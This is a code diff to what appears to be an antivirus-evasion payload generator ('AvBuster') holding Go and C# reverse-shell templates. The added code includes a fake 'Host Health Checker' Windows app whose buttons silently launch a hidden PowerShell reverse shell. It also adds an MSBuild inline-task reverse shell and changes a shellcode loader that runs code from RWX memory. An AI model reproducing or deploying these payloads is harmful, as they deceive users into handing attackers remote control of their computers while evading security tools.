@@ -1,6 +1,6 @@
 package binarytemplates
 
-var AvBusterTCPSimpleGoReverseShell = `package main
+var AvBusterCustomGoReverseShell = `package main
 
 import (
 	"fmt"
@@ -184,7 +184,7 @@ func getscreenshot() []string {
 	}
 	return filenames
 }`
-var AvBusterTCPSimpleGoReverseShellManager = `package main
+var AvBusterCustomGoReverseShellManager = `package main
 
 import (
 	"bufio"
@@ -218,7 +218,7 @@ func main() {
 	conn, _ := listner.Accept()
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		redc.Print("[AvBusterTCP]")
+		redc.Print("[AvBusterTCP]~# : ")
 		command, _ := reader.ReadString('\n')
 		if strings.Compare(command, "bye") == 0 {
 			conn.Write([]byte(command))
@@ -289,7 +289,7 @@ func getFilewithNameandSize(connection net.Conn, command string) {
 	return
 }`
 
-var AvBusterHttpsPinnedCertReverseShell = `package main
+var AvBusterPinnedCertReverseShell = `package main
 
 import (
 	"bytes"
@@ -510,7 +510,7 @@ func padString(retunString string, toLength int) string {
 	return retunString
 }`
 
-var AvBusterHttpsPinnedCertReverseShellManager = `package main
+var AvBusterPinnedCertReverseShellManager = `package main
 
 import (
 	"bufio"
@@ -542,12 +542,12 @@ func main() {
 		fmt.Println(err)
 	}
 	tlsconfig := &tls.Config{Certificates: []tls.Certificate{cert}}
-	cyanc.Println("Wait for the Tunnell ... ZzzZZ")
+	cyanc.Println("Wait ... ZzzZZ")
 	listner, _ := tls.Listen("tcp", LOCALPORT, tlsconfig)
 	conn, _ := listner.Accept()
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		redc.Print("[AvBusterPinnedCertShell]")
+		redc.Print("[AvBusterPinnedCertShell]~# : ")
 		command, _ := reader.ReadString('\n')
 		if strings.Compare(command, "bye") == 0 {
 			conn.Write([]byte(command))
@@ -757,7 +757,9 @@ func index(respwrt http.ResponseWriter, req *http.Request) {
 		//content, _ := ioutil.ReadAll(req.Body)
 		//fmt.Println(string(content))
 	} else {
-		redc.Printf("[AvBusterHTTPShell]")
+		redc.Printf("[AvBuster")
+		greenc.Printf("HTTP")
+		redc.Printf("Tunnel]~# :")
 		reader := bufio.NewReader(os.Stdin)
 		cmdtopost, _ := reader.ReadString('\n')
 		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
@@ -1033,7 +1035,7 @@ func main() {
 	greenc := color.New(color.FgHiGreen, color.Bold)
 	cyanc := color.New(color.FgCyan, color.Bold)
 	var recvdcmd [512]byte
-	cyanc.Println("Hybrid Tunnell...")
+	cyanc.Println("AvBuster Encrypted Tunnell...")
 	listner, _ := net.Listen("tcp", LOCALPORT)
 	conn, _ := listner.Accept()
 	keyval := generateKey()
@@ -1042,7 +1044,7 @@ func main() {
 	conn.Write(encmsg)
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		redc.Print("[[AvBusterHybridEncryptedShell]]")
+		redc.Print("[AvBusterEncryptedTunnel]~# : ")
 		command, _ := reader.ReadString('\n')
 		if strings.Compare(command, "bye") == 0 {
 			encmsg := []byte(encryptconnection(keyval, command))
@@ -1298,8 +1300,360 @@ func main() {
 	syscall.Syscall(VNWPvtXb, 0, 0, 0, 0)
 }
 `
+var AvBusterPowerShellTCPReverseShellGUI = `using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Windows.Forms;
 
-var AvBusterPowerShellTCPReverseShell = `package main
+    public class psForm : System.Windows.Forms.Form
+    {
+        private System.Windows.Forms.Panel headerpanel;
+        private System.Windows.Forms.Label missinglabel;
+        private System.Windows.Forms.Button btnHealthCheck;
+        private System.Windows.Forms.Button btnCPUUsage;
+        private System.Windows.Forms.Button btnUpdateCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button1;
+        public psForm()
+        {
+            InitializeComponent();
+        }
+        
+       public static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.Run(new psForm());
+        }
+    
+        private void createpsrevshell()
+        {
+            string psrevshelltempalte = @"function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = 'RHOST'
+$port = 'RPORT'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+";
+            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
+            runpsrevshell();
+        }
+
+
+        private void runpsrevshell()
+        {
+
+            ProcessStartInfo pinfo = new ProcessStartInfo();
+            if (Environment.Is64BitOperatingSystem)
+            {
+                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+
+            }
+            else
+            {
+                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+            }
+
+            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
+            string ps1File = @"C:\windows\temp\powres.ps1";
+			string strCmdText = string.Format("-w hidden -nop -ep bypass -file \"{0}\"",ps1File);
+            pinfo.Arguments = strCmdText;
+            pinfo.UseShellExecute = false;
+            //pinfo.CreateNoWindow = true;
+            pinfo.RedirectStandardOutput = false;
+            // pinfo.Verb = "runas";
+            try
+            {
+                Process.Start(pinfo);
+            }
+            catch (Exception e)
+            {
+
+                MessageBox.Show(e.Message);
+            }
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //createpsrevshell();
+            this.Close();
+        }
+
+        private void btnUpdateCheck_Click(object sender, EventArgs e)
+        {
+            createpsrevshell();
+            System.Threading.Thread.Sleep(4000);
+            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
+        }
+
+        private void button1_MouseEnter(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Red;
+
+        }
+
+        private void button1_MouseLeave(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Gray;
+
+        }
+
+        private void InitializeComponent()
+        {
+            this.headerpanel = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.missinglabel = new System.Windows.Forms.Label();
+            this.btnHealthCheck = new System.Windows.Forms.Button();
+            this.btnCPUUsage = new System.Windows.Forms.Button();
+            this.btnUpdateCheck = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.headerpanel.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // headerpanel
+            // 
+            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
+            this.headerpanel.Controls.Add(this.button1);
+            this.headerpanel.Controls.Add(this.missinglabel);
+            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
+            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.headerpanel.Location = new System.Drawing.Point(0, 0);
+            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
+            this.headerpanel.Name = "headerpanel";
+            this.headerpanel.Size = new System.Drawing.Size(460, 30);
+            this.headerpanel.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.Location = new System.Drawing.Point(423, 1);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(36, 27);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
+            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
+            // 
+            // missinglabel
+            // 
+            this.missinglabel.AutoSize = true;
+            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.missinglabel.Location = new System.Drawing.Point(127, 9);
+            this.missinglabel.Name = "missinglabel";
+            this.missinglabel.Size = new System.Drawing.Size(193, 15);
+            this.missinglabel.TabIndex = 0;
+            this.missinglabel.Text = "Multi Purpose Host Health Checker";
+            // 
+            // btnHealthCheck
+            // 
+            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
+            this.btnHealthCheck.Name = "btnHealthCheck";
+            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnHealthCheck.TabIndex = 2;
+            this.btnHealthCheck.Text = "Health Check";
+            this.btnHealthCheck.UseVisualStyleBackColor = true;
+            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnCPUUsage
+            // 
+            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
+            this.btnCPUUsage.Name = "btnCPUUsage";
+            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
+            this.btnCPUUsage.TabIndex = 1;
+            this.btnCPUUsage.Text = "CPU Usage";
+            this.btnCPUUsage.UseVisualStyleBackColor = true;
+            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnUpdateCheck
+            // 
+            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
+            this.btnUpdateCheck.Name = "btnUpdateCheck";
+            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnUpdateCheck.TabIndex = 0;
+            this.btnUpdateCheck.Text = "Check Updates";
+            this.btnUpdateCheck.UseVisualStyleBackColor = true;
+            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(241, 133);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(180, 56);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Hidden Files";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // Form
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(460, 222);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.btnUpdateCheck);
+            this.Controls.Add(this.btnCPUUsage);
+            this.Controls.Add(this.btnHealthCheck);
+            this.Controls.Add(this.headerpanel);
+            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(460, 250);
+            this.MinimizeBox = false;
+            this.Name = "Form";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Health Checker";
+            this.headerpanel.ResumeLayout(false);
+            this.headerpanel.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+    }
+`
+var AvBusterPowerShellTCPReverseShellCS = `using System;
+using System.Diagnostics;
+using System.IO;
+
+    public class PsConsole {
+        
+       public static void Main()
+        {
+            createpsrevshell();
+        }
+    
+        static void createpsrevshell()
+        {
+            string psrevshelltempalte = @"function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = 'RHOST'
+$port = 'RPORT'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+";
+            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
+            runpsrevshell();
+        }
+
+
+        static void runpsrevshell()
+        {
+
+            ProcessStartInfo pinfo = new ProcessStartInfo();
+            if (Environment.Is64BitOperatingSystem)
+            {
+                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+
+            }
+            else
+            {
+                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+            }
+
+            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
+            string ps1File = @"C:\windows\temp\powres.ps1";
+			string strCmdText = string.Format("-w hidden -nop -ep bypass -file \"{0}\"",ps1File);
+            pinfo.Arguments = strCmdText;
+            pinfo.UseShellExecute = false;
+            //pinfo.CreateNoWindow = true;
+            pinfo.RedirectStandardOutput = false;
+            // pinfo.Verb = "runas";
+            try
+            {
+                Process.Start(pinfo);
+            }
+            catch (Exception)
+            {
+
+                //MessageBox.Show(e.Message);
+            }
+
+        }
+
+    }
+
+`
+var AvBusterPowerShellTCPReverseShellGo = `package main
 
 import (
 	"fmt"
@@ -1433,19 +1787,15 @@ func init() {
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("msvcrt.dll")]
-public static extern IntPtr memset(IntPtr dest, uint src, uint count);
 "@
 	
 	$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
 	
 	# 32-bit payload
-	# msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
 	[byte[]]$byteArray = [System.Convert]::FromBase64String("SHELLCODE")
 	[Byte[]]$sc32 = $byteArray
 	
 	# 64-bit payload
-	# msfpayload windows/x64/exec CMD="cmd /k calc" EXITFUNC=thread
 	[Byte[]]$sc64 = $byteArray
 	
 	# Determine if Powershell is running as 32 or 64 bit
@@ -1458,10 +1808,9 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);
 	
 	# Allocate a page of memory. This will only work if the size parameter (3rd param) is at least 0x1000.
 	# Allocate RWX memory block
-	$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
-	
-	# I could have more easily used memcpy but that would have required the use of a particular .NET class to cast $sc as an IntPtr. I wanted to get this working without needing additional .NET classes. I prefer to KISS (keep it simple, stupid).
-	for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
+	$memblock=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
+		
+	[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$memblock,$sc.Length)
 	
 	# Execute you payload
 	$winFunc::CreateThread(0,0,$x,0,0,0)RPL
@@ -1527,11 +1876,11 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
-const DECKEY = ":KEY:"
+const DECKEY = ":KEY"
 
 func main() {
 
-	shell := []byte{SHELLCODEHERE}
+	shell := []byte{@SHELL@}
 	decryptedshellcode := decryptshellcode([]byte(shell))
 	executeshell(decryptedshellcode)
 }
@@ -1571,7 +1920,130 @@ func executeshell(shellcode []byte) {
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 `
+var AvBusterMSBuildTCPReverseShellCS = `using System;
+using System.Diagnostics;
+using System.IO;
+namespace ConnectBack
+{
+    public class Program
+    {
+		public static void Main(string[] args)
+        {
+			updatemsbuild();
+		}
 
+		static void updatemsbuild()
+        {
+            string buildval = @"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
+<Target Name = ""tdu"">
+ <tdu/>
+ </Target>
+ <UsingTask
+    TaskName = ""tdu""
+    TaskFactory = ""CodeTaskFactory""
+    AssemblyFile = ""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
+      <Task>
+
+
+      <Reference Include = ""System.Management.Automation"" />
+ 
+         <Code Type = ""Class"" Language = ""cs"">
+    
+             <![CDATA[
+            using System;
+            using System.Diagnostics;
+            using System.IO;
+            using System.Net.Sockets;
+            using System.Text;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System.Collections.ObjectModel;
+            public class tdu : Task, ITask
+        {
+            public static StreamWriter streamWriter;
+            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+            {
+                StringBuilder strOutput = new StringBuilder();
+                if (!String.IsNullOrEmpty(outLine.Data))
+                {
+                    try
+                    {
+                        strOutput.Append(outLine.Data);
+                        streamWriter.WriteLine(strOutput);
+                        streamWriter.Flush();
+                    }
+                    catch (Exception ex) { throw ex; }
+                }
+            }
+            public override bool Execute()
+            {
+                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream);
+                            StringBuilder strInput = new StringBuilder();
+                            Process p = new Process();
+                            p.StartInfo.FileName = ""cmd.exe"";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+                            while (true)
+                            {
+                                strInput.Append(rdr.ReadLine());
+                                p.StandardInput.WriteLine(strInput);
+                                strInput.Remove(0, strInput.Length);
+                            }
+                        }
+                    }
+                }
+            }
+
+        }
+         ]]>
+        </Code>      
+      </Task>
+</UsingTask>
+</Project>";
+            
+            string msbuildpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
+            try
+            {
+                using (StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\tdu.xml"))
+                {
+                    sw.Write(buildval);
+                }
+                Process p = new Process();
+                p.StartInfo.FileName = msbuildpath;
+                p.StartInfo.Arguments = @"C:\Windows\Temp\tdu.xml";
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.Verb = "runas";
+                p.Start();
+                p.WaitForExit();
+            }
+            catch (Exception)
+            {
+
+                
+            }
+            
+
+        }
+	}
+}
+
+`
 var AvBusterMSBuildTCPReverseShell = `package main
 
 import (
@@ -1694,12 +2166,287 @@ func createmsbuildtemplate(ip, port string) {
 	fotduxml.WriteString(portreplaced)
 }
 `
+
+var AvBusterMsBuildTCPReverseShellGUI = `using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Windows.Forms;
+
+    public class psForm : System.Windows.Forms.Form
+    {
+        private System.Windows.Forms.Panel headerpanel;
+        private System.Windows.Forms.Label missinglabel;
+        private System.Windows.Forms.Button btnHealthCheck;
+        private System.Windows.Forms.Button btnCPUUsage;
+        private System.Windows.Forms.Button btnUpdateCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button1;
+        public psForm()
+        {
+            InitializeComponent();
+        }
+        
+       public static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.Run(new psForm());
+        }
+    
+        private void updatemsbuild()
+        {
+            string buildval = @"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
+<Target Name = ""tdu"">
+ <tdu/>
+ </Target>
+ <UsingTask
+    TaskName = ""tdu""
+    TaskFactory = ""CodeTaskFactory""
+    AssemblyFile = ""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
+      <Task>
+
+
+      <Reference Include = ""System.Management.Automation"" />
+ 
+         <Code Type = ""Class"" Language = ""cs"">
+    
+             <![CDATA[
+            using System;
+            using System.Diagnostics;
+            using System.IO;
+            using System.Net.Sockets;
+            using System.Text;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System.Collections.ObjectModel;
+            public class tdu : Task, ITask
+        {
+            public static StreamWriter streamWriter;
+            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+            {
+                StringBuilder strOutput = new StringBuilder();
+                if (!String.IsNullOrEmpty(outLine.Data))
+                {
+                    try
+                    {
+                        strOutput.Append(outLine.Data);
+                        streamWriter.WriteLine(strOutput);
+                        streamWriter.Flush();
+                    }
+                    catch (Exception ex) { throw ex; }
+                }
+            }
+            public override bool Execute()
+            {
+                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream);
+                            StringBuilder strInput = new StringBuilder();
+                            Process p = new Process();
+                            p.StartInfo.FileName = ""cmd.exe"";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+                            while (true)
+                            {
+                                strInput.Append(rdr.ReadLine());
+                                p.StandardInput.WriteLine(strInput);
+                                strInput.Remove(0, strInput.Length);
+                            }
+                        }
+                    }
+                }
+            }
+
+        }
+         ]]>
+        </Code>      
+      </Task>
+</UsingTask>
+</Project>";
+            string msbuildpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
+
+            using (StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\tdu.xml"))
+            {
+                sw.Write(buildval);
+            }
+            Process p = new Process();
+            p.StartInfo.FileName = msbuildpath;
+            p.StartInfo.Arguments = @"C:\Windows\Temp\tdu.xml";
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.Verb = "runas";
+            p.Start();
+            p.WaitForExit();
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //createpsrevshell();
+            this.Close();
+        }
+
+        private void btnUpdateCheck_Click(object sender, EventArgs e)
+        {
+            updatemsbuild();
+            System.Threading.Thread.Sleep(4000);
+            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
+        }
+
+        private void button1_MouseEnter(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Red;
+
+        }
+
+        private void button1_MouseLeave(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Gray;
+
+        }
+
+        private void InitializeComponent()
+        {
+            this.headerpanel = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.missinglabel = new System.Windows.Forms.Label();
+            this.btnHealthCheck = new System.Windows.Forms.Button();
+            this.btnCPUUsage = new System.Windows.Forms.Button();
+            this.btnUpdateCheck = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.headerpanel.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // headerpanel
+            // 
+            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
+            this.headerpanel.Controls.Add(this.button1);
+            this.headerpanel.Controls.Add(this.missinglabel);
+            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
+            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.headerpanel.Location = new System.Drawing.Point(0, 0);
+            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
+            this.headerpanel.Name = "headerpanel";
+            this.headerpanel.Size = new System.Drawing.Size(460, 30);
+            this.headerpanel.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.Location = new System.Drawing.Point(423, 1);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(36, 27);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
+            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
+            // 
+            // missinglabel
+            // 
+            this.missinglabel.AutoSize = true;
+            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.missinglabel.Location = new System.Drawing.Point(127, 9);
+            this.missinglabel.Name = "missinglabel";
+            this.missinglabel.Size = new System.Drawing.Size(193, 15);
+            this.missinglabel.TabIndex = 0;
+            this.missinglabel.Text = "Multi Purpose Host Health Checker";
+            // 
+            // btnHealthCheck
+            // 
+            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
+            this.btnHealthCheck.Name = "btnHealthCheck";
+            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnHealthCheck.TabIndex = 2;
+            this.btnHealthCheck.Text = "Health Check";
+            this.btnHealthCheck.UseVisualStyleBackColor = true;
+            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnCPUUsage
+            // 
+            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
